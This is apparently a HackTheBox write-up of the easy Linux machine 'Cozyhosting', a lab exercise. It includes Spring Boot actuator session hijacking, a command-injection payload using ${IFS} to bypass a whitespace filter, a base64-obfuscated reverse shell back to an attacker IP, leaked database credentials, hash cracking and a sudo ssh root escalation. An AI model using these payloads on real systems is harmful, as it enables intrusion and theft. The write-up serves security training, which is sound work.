---
title: Cozyhosting - HTB Writeup
date: 2024-03-02 10:03
categories: [ctf, linux, easy]
tags: [htb, linux, ctf, easy, cozyhosting]    # TAG names should be lowercase
---


# Machine Overview

"Cozyhosting" was an easy-rated Linux machine, involving the exploitation of a **command injection** vulnerability to gain shell access as the **App** user. The cloudhosting-0.0.1.jar file leaked the username and password of the PostgreSQL database. From the database, we obtained the hashed password of the **josh** user, which was easily cracked, leading to shell access on the machine as **josh**. For privilege escalation, we abused the **ssh** binary to gain root access on the machine.

![Pasted image 20240302171829](https://github.com/iammR0OT/HTB/assets/74102381/90953103-a7d8-4386-9ca8-fd1f7b93747a)

# User

## Scanning Through NMAP

First, we'll use **nmap** to scan the entire network and identify the services running. I'll use the **-p-** flag to scan all **65535** ports with a **--min-rate 10000** to speed up the process. After scanning, we'll filter the results to show only the open ports using various terminal tools like **cut** and **tr**. Here's the complete command:

```bash
$ nmap -p- --min-rate 10000 10.10.11.230 -oN ini.txt && cat ini.txt | cut  -d ' ' -f1 | tr -d '/tcp' | tr '\n' ','
```

Now, let's run a thorough scan on these specific ports using...

```bash
$ nmap -p22,80 -sC -sV -A -T4 10.10.11.230 -oN scan.txt
```

 - **-sC** is to run all the default scripts,
 - **-sV** for service and version detection
 - **-A** for Enable OS detection, version detection, script scanning, and traceroute
 - **-T4** for aggressive scan 
 - **-oN** to write the result into a specified file.

```bash
PORT      STATE  SERVICE  VERSION
22/tcp    open   ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp    open   http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Information Gathering
  
Through Nmap, we discovered that port 22 (SSH) is open, which can allow us to log into the machine with valid credentials. Port 80 (HTTP) is also open, redirecting us to `cozyhosting.htb`. Let's add this information to our local DNS file called `/etc/hosts` for domain resolution on our computer.

```bash
$ echo "10.10.11.230  cozyhosting.htb" | sudo tee -a /etc/hosts

10.10.11.230  cozyhosting.htb
```

### Port 80 http

Let's check what is running on port **80** (HTTP). A website from a hosting provider company is running on it, with an interactive button on the navbar called **login**.
 
![Pasted image 20240302141941](https://github.com/iammR0OT/HTB/assets/74102381/a27fa96b-22fd-4f32-ae4f-b504a90968a9)

#### Stack

Let's discover the technologies running on the backend of the website using **Wappalyzer**.

![Pasted image 20240302141539](https://github.com/iammR0OT/HTB/assets/74102381/77754a0f-833a-4c25-b0cc-6cf2a6f18825)


If we paste an invalid page path on the website, we encounter a strange **404** page.

![Pasted image 20240302142122](https://github.com/iammR0OT/HTB/assets/74102381/8a8e0c47-6811-48e5-8a80-f4044b717025)

With a quick Google search of this page, I discovered that this is the default error page of the **Spring Boot** framework. [source](https://stackoverflow.com/questions/63813805/whitelabel-error-page-this-application-has-no-configured-error-view-so-you-are)

![Pasted image 20240302142312](https://github.com/iammR0OT/HTB/assets/74102381/f0e29cdb-ce6a-4769-a806-7f96f7a088a0)

#### Exploiting Springboot

Spring Boot is **an open-source, microservice-based Java web framework offered by Spring**, particularly useful for software engineers developing web apps and microservices.
A wordlist called **spring-boot.txt** is available in seclists, which can be used to fuzz the directories in the websites. For fuzzing, I will be using a tool called **ffuf**, a **fuzzing tool to detect content and elements on webservers and web applications**.
ffuf finds some directories for us.

```bash
$ ffuf -u http://cozyhosting.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt 

________________________________________________

 :: Method           : GET
 :: URL              : http://cozyhosting.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/spring-boot.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

actuator                [Status: 200, Size: 634, Words: 1, Lines: 1, Duration: 408ms]
actuator/env/home       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 445ms]
actuator/env/lang       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 258ms]
actuator/env/path       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 225ms]
actuator/env            [Status: 200, Size: 4957, Words: 120, Lines: 1, Duration: 460ms]
actuator/health         [Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 292ms]
actuator/sessions       [Status: 200, Size: 48, Words: 1, Lines: 1, Duration: 215ms]
actuator/mappings       [Status: 200, Size: 9938, Words: 108, Lines: 1, Duration: 381ms]
actuator/beans          [Status: 200, Size: 127224, Words: 542, Lines: 1, Duration: 356ms]
:: Progress: [112/112] :: Job [1/1] :: 116 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

On the `actuator/sessions` page, we found a session cookie for the user **kanderson**
`F0982EDEAB0F78EB6925671546B39FAE :  kanderson`

![Pasted image 20240302143221](https://github.com/iammR0OT/HTB/assets/74102381/b18b2d17-afc0-4aef-9c2f-de4b2421eaa5)

Let's use this cookie to log in as the user **kanderson** on the web. Press F12 and navigate to the storage tab. Replace the value of **JSESSIONID** with the value of the **kanderson** user, then reload the page.

![Pasted image 20240302143518](https://github.com/iammR0OT/HTB/assets/74102381/3c6e6fd3-8571-4ff0-aac9-c8109fa5e2bc)

We were able to log in as the user **kanderson** on the web, and it turns out that **kanderson** has admin privileges on the domain.

![Pasted image 20240302143807](https://github.com/iammR0OT/HTB/assets/74102381/24cec136-fa75-41be-852e-4e9add555935)

### Shell as APP

At the bottom of the page, there is a feature for automatic patching that accepts two inputs from the user:
- Hostname
- Username

It checks the private key of the given username in `.ssh/authorized_keys`. If the username provided in the input has the key in that location, then it will establish a connection; otherwise, it will throw an error "Host Key verification failed." This suggests that there is some kind of command running in the username part, which compares our username with the private key present in `.ssh/authorized_keys`. Let's intercept it in Burp and check if we can make it run our malicious command on the server.

![Pasted image 20240302144148](https://github.com/iammR0OT/HTB/assets/74102381/65586429-b09c-4a3e-90ba-cadfd4de547b)

And we can run our commands in the username field. The payload will be `iamr0ot;$(pwd)`.

- `$(<command>)` in Bash is utilized for command substitution, allowing the execution of commands and substitution of their output. Command substitution is a facility that allows a command to be run, and its output to be pasted back on the command line as arguments to another command.

![Pasted image 20240302150349](https://github.com/iammR0OT/HTB/assets/74102381/49941783-2503-4d92-800d-6fb9703d5234)


So we can run any command on the server. But the issue here is, whitespace characters are blocked. I also tried using `+` and `%20` to bypass it, but these are also blocked.

![Pasted image 20240302151605](https://github.com/iammR0OT/HTB/assets/74102381/cea688a1-3cf0-42ab-b6e4-8b6b9d56fb12)

After some research, I discovered that we can use `${IFS}` as a space in Bash. **IFS** is a special variable in Bash used to control the field separator for hyphenation and line parsing. By default, IFS is set to a space, a tab, and a newline character, which means that fields in a string are separated by any combination of these characters. We were able to bypass the white spaces using `${IFS}`. ([source](https://www.tutorialspoint.com/the-meaning-of-ifs-in-bash-scripting-on-linux#:~:text=IFS%20is%20a%20special%20variable,any%20combination%20of%20these%20characters.))

![Pasted image 20240302152518](https://github.com/iammR0OT/HTB/assets/74102381/bd7c46b6-838a-4f98-9c39-a322df3eb982)

Let's get a shell on the box. I mostly use [revshells.com](https://www.revshells.com/) for reverse shell payloads. 
Start a listener on your attacking machine to receive the shell.

```bash
$ nc -lvnp 90
```

- **-l** for listener
- **-v** for verbosity
- **-n** for numeric IP address, no DNS name.
- **-p** for port number

![Pasted image 20240302153838](https://github.com/iammR0OT/HTB/assets/74102381/a8d68742-13de-419f-8052-6752fc4584b3)

Paste the payload into the username parameter. The payload will be:

```bash
$(echo${IFS}"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMy85MCAwPiYx"|base64${IFS}-d|bash)
```

![Pasted image 20240302164429](https://github.com/iammR0OT/HTB/assets/74102381/51a1c725-e25d-484c-a0f6-7a613a32ae7c)

And we got a shell back within no time.

![Pasted image 20240302153935](https://github.com/iammR0OT/HTB/assets/74102381/45c9fac6-66bf-4751-b7b3-fbc0e5ac41df)

Let's make this shell fully interactive and stable using:

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'  # for interactive shell
$ export TERM=xterm # to sets the terminal emulator to linux
$ CTRL+Z   # to background the process
$ stty raw -echo;fg   # to make shell stable
```

![Pasted image 20240302154713](https://github.com/iammR0OT/HTB/assets/74102381/d231406b-829a-4311-bce8-ef779085a858)

### Shell as Josh

So there are basically two users on the machine, **josh** and **root**. Also, there is a **PostgreSQL** database running on the machine. If somehow we manage to obtain the credentials of the database, we could find juicy information there.

![Pasted image 20240302154846](https://github.com/iammR0OT/HTB/assets/74102381/bb1e6f29-9262-4a28-86f1-3e2f3c6d434e)

There is a `cloudhosting-0.0.1.jar` file present in the `/app` directory. Let's download it to our local machine. Since Python is present on the machine, I will run a Python server on the victim machine to download the files.

![Pasted image 20240302155213](https://github.com/iammR0OT/HTB/assets/74102381/b54c9692-04b0-4b2f-bdb1-082d888c8dbb)

The file has been successfully downloaded to our attacking machine. Let's analyze it now.

![Pasted image 20240302155419](https://github.com/iammR0OT/HTB/assets/74102381/0278e4a0-4fd2-47da-b284-e70bbb5dc91e)

In the `/BOOT-INF/classes/` directory, there is a file called **application.properties** present, which contains the credentials for the PostgreSQL database.

![Pasted image 20240302155527](https://github.com/iammR0OT/HTB/assets/74102381/85961630-a05a-4f9f-93d0-48118ed64e96)

```
postgres  :  Vg&nvzAQ7XxR
```

![Pasted image 20240302155654](https://github.com/iammR0OT/HTB/assets/74102381/c54cd3e7-d073-4f76-b433-a15f07d863cf)

Let's connect to the database using `psql` and check what interesting data is present using the following command:

```
$ psql "postgresql://postgres:Vg&nvzAQ7XxR@localhost/postgres"
```

![Pasted image 20240302160020](https://github.com/iammR0OT/HTB/assets/74102381/86f7cc93-d25b-4199-8099-bc63d2c0a781)

Use `\l` (list) to list all the databases. We found one named cozyhosting. Let's check its contents.

![Pasted image 20240302160346](https://github.com/iammR0OT/HTB/assets/74102381/be7eaefb-bed1-4d24-810e-a5f3554fdde6)

Use `\c cozyhosting` (connect) command to connect to the cozyhosting database. After connecting, use `\dt` (list tables) to display the tables in the database. In our case, there are two tables present: **hosts** and **users**.

![Pasted image 20240302160806](https://github.com/iammR0OT/HTB/assets/74102381/2474b4db-4286-405e-9a7d-9507b519d93f)

Let's list the content of the **users** table using the command `SELECT * FROM users;`. In the **users** table, we can find the Bcrypt hashed passwords of the **kanderson** and **admin** users.

![Pasted image 20240302161007](https://github.com/iammR0OT/HTB/assets/74102381/8e55e369-e349-404f-9c5e-d423d6e8f5ed)

We can crack it using **hashcat** or **john**, but here I will be using [hashes.com](https://hashes.com/en/decrypt/hash) for password decryption, an online hash cracking platform. We were able to crack the hash of the admin user, and the password is: `manchesterunited`.

![Pasted image 20240302162217](https://github.com/iammR0OT/HTB/assets/74102381/9c8d875d-a9a9-4964-8890-63f3fcfaaeee)

According to the `/etc/passwd` file, there are only two users present on the machine: **josh** and **root**. This password didn't work for the root user, but we were able to gain a shell as the **josh** user using these credentials:

```
$ sshpass -p manchesterunited ssh josh@10.10.11.230 
```

You can retrieve your user flag from the **user.txt** file located in the **josh** home directory.

![Pasted image 20240302163124](https://github.com/iammR0OT/HTB/assets/74102381/56d51d82-4c34-4d57-98a6-9c1c9f9eb895)

# Privilege Escalation

We observed that our user **josh** can execute **ssh** as the **root** user.
You can use the `sudo -l` command to display all commands that our user can run with elevated privileges using `sudo`.

![Pasted image 20240302163517](https://github.com/iammR0OT/HTB/assets/74102381/9b78c2c5-394f-45e8-bde9-22b0fc75564b)

In **GTFOBins**, we can find a method to exploit the **ssh** binary to escalate our privileges to root. GTFOBins is a curated list of Unix binaries that can be utilized to bypass local security restrictions in misconfigured systems.

According to **GTFOBins**, if the **ssh** binary is permitted to execute as a superuser via `sudo`, it retains the elevated privileges and can be exploited to access the file system, escalate privileges, or maintain persistent access. [source](https://gtfobins.github.io/gtfobins/ssh/#sudo)

The command to exploit this binary is:

```bash
$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

![Pasted image 20240302163931](https://github.com/iammR0OT/HTB/assets/74102381/1e6a290c-63cd-4b47-9555-025818c7b700)

# Flags

User : 508b35571a870a.....5ed945a115d5c

Root : 04f048d88b...........0ec01273b538547

# Happy Hacking ❤
